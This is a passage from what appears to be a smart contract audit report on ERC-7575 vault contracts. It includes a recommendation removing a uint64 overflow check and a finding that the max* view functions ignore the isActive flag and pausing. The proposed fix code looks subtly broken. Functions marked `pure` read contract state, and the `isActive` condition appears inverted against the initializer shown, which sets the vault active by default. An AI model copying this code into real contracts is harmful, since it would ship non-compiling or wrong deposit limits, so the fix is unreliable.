## Recommendation

```solidity
function initialize(IERC20Metadata asset_, address shareToken_, address owner) public initializer {
    // SNIP

    VaultStorage storage $ = _getVaultStorage();
    $.asset = address(asset_);
    $.assetDecimals = assetDecimals;
    $.shareToken = shareToken_;
    $.investmentManager = owner; // Initially owner is investment manager
    $.isActive = true; // Vault is active by default

    // Calculate scaling factor for decimal normalization: 10^(18 - assetDecimals)
    uint256 scalingFactor = 10 ** (DecimalConstants.SHARE_TOKEN_DECIMALS - assetDecimals);
-   if (scalingFactor > type(uint64).max) revert ScalingFactorTooLarge(); 
    $.scalingFactor = uint64(scalingFactor);
    $.minimumDepositAmount = 1000;
}
```

---

## 13. maxMint

## Vulnerability Detail

It is stated in EIP-7575 that: `The existing definitions from [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) apply.`

In EIP-4626, view methods prefixed with ‘max,’ such as `maxMint()`, `maxDeposit()`, `maxRedeem()`, `maxWithdraw()`, should account for 

both global and user-specific limits.

Both `ERC7575VaultUpgradeable` and `WERC7575Vault` have an admin-controlled parameter, `isActive`, which prevents deposits when enabled.

`WERC7575Vault` implements pausing functionality that should be considered in these methods as well.

## Recommendation

```solidity
// WERC7575Vault.sol
function maxDeposit(address) public pure returns (uint256) {
    if (isActive || paused()) return 0;
    return type(uint256).max;
}

function maxMint(address) public pure returns (uint256) {
    if (isActive || paused()) return 0;
    return type(uint256).max;
}

function maxWithdraw(address owner) public view returns (uint256) {
    return _convertToAssets(_shareToken.balanceOf(owner), Math.Rounding.Floor);
}

function maxRedeem(address owner) public view returns (uint256) {
    return _shareToken.balanceOf(owner);
}
```

```solidity
// ERC7575VaultUpgradeable.sol
function maxDeposit(address) public pure returns (uint256) {
    if (isActive) return 0;
    return type(uint256).max;
}

function maxMint(address) public pure returns (uint256) {
    if (isActive) return 0;
    return type(uint256).max;
}
```
